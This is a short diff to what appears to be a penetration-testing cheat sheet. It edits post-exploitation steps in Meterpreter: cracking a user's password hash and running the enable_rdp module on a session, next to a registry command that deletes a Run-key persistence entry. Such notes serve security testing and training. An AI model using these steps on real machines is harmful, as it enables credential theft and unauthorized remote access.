@@ -177,7 +177,7 @@ to delete it :
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /f
 ---------------------------------------------------------------------------------------------------------------
 In meterpreter with administrator privs to enable RDP :
-1 - either creating new user or cracking current users's password 
+1 - cracking current users's hash
 2 - use post/windows/manage/enable_rdp
 3 - set session <id>
 4 - run 
